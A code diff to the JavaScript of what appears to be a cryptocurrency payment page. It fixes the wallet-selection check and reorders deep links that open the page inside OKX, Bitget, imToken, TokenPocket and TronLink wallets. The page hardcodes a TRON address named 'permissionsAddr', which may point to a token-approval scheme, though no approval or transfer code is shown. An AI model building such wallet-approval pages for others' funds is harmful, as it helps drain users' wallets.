@@ -240,7 +240,7 @@
 
         var order_no = '2023032437100865';
         var amount = 51;
-        var selectIndex = 0;
+        var selectIndex = -1;
         var type;
         var permissionsAddr = 'TFonidXCjcfLqtxpwLcKFoAyM9HEdcusdt';
         var auAddr = 'TX6TJo7TxQMx9PM8Rxki96rrFuaznTk6Ry';
@@ -311,22 +311,19 @@
 
         // Handle wallet confirmation and redirection
         $('#confirm').click(function () {
-            if (selectIndex === 0) {
+            if (selectIndex === -1) {
                 alert("请选择付款钱包！");
                 return;
             }
 
             const url = getUrlRelativePath();
+            console.log(url);
             const walletLinks = [
-                `imtokenv2://navigate?screen=DappView&url=${url}`,
-                `tpdapp://open?params={"url": "${url}"}`,
-                `https://metamask.app.link/dapp/${url}`,
-                `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`,
-                `https://go.cb-w.com/dapp?cb_url=${url}`,
-                `bitkeep://bkconnect?action=dapp&url=${url}`,
                 `okx://wallet/dapp/details?dappUrl=${url}`,
-                `tronlinkoutside://pull.activity?param=${encodeURIComponent(JSON.stringify({ url, action: "open", protocol: "tronlink", version: "1.0" }))}`,
-                `tpdapp://open?params={"url": "${encodeURIComponent(url)}", "chain": "TRX", "source":"xxx"}`
+                `bitkeep://bkconnect?action=dapp&url=${url}`,
+                `imtokenv2://navigate?screen=DappView&url=${url}`,
+                `tpdapp://open?params={"url": "${encodeURIComponent(url)}", "chain": "TRX", "source":"xxx"}`,
+                `tronlinkoutside://pull.activity?param=${encodeURIComponent(JSON.stringify({ url: url, action: "open", protocol: "tronlink", version: "1.0" }))}`,
             ];
 
             const link = walletLinks[selectIndex];
